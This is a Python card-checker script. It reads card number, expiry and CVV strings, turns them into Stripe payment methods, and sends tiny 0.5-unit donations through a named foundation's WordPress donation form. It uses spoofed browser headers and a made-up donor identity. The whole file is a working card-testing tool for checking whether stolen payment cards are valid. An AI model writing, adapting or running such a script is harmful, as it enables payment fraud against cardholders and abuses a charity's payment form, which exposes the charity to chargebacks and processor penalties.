import requests
from pm import extractpm
import time

def checker(cc):       
    try:        
        cc_data = cc.strip().split('|')
        if len(cc_data) != 4:
            raise ValueError(f"Unexpected format for card data: {cc_data}")
    
        cnn, month, year, cvv = map(str.strip, cc_data)
        if year.startswith("20"):
            year = year[2:]
        pm = extractpm(cnn, month, year, cvv)
       # print(pm)
    except ValueError as e:
        print(f"Error processing card: {e}")
        
    
    url = "https://fondazioneippocrate.org/wp-admin/admin-ajax.php"

    params = {
      't': "1732769664870"
    }
    
    payload = {
  "data": "__fluent_form_embded_post_id=1284&_fluentform_7_fluentformnonce=85eea3e72d&_wp_http_referer=%2Fdonazione-legale%2F&names%5Bfirst_name%5D=Lauryn&names%5Blast_name%5D=Trantow&email=bit100101%40proton.me&phone=13527952738&payment_input=Altro&custom-payment-amount_1=0.5&gdpr-agreement=on&payment_method=stripe&__stripe_payment_method_id=" + str(pm),
  "action": "fluentform_submit",
  "form_id": "7"
}



    headers = {
      'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
      'authority': "fondazioneippocrate.org",
      'accept-language': "en-US,en;q=0.9",
      'origin': "https://fondazioneippocrate.org",
      'referer': "https://fondazioneippocrate.org/donazione-legale/",
      'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
      'sec-ch-ua-mobile': "?1",
      'sec-ch-ua-platform': "\"Android\"",
      'sec-fetch-dest': "empty",
      'sec-fetch-mode': "cors",
      'sec-fetch-site': "same-origin",
      'x-requested-with': "XMLHttpRequest",
      #'Cookie': "__stripe_mid=9d5de7dc-bb6a-406e-82a8-d1f9479d2cd567d76e; __stripe_sid=b7c90766-ca5e-4b4f-9dd0-eeff69e3a4baf7e992"
    }
    
    response = requests.post(url, params=params, data=payload, headers=headers)

    result2 = response.text
    #print(response.text)
    return result2
    
    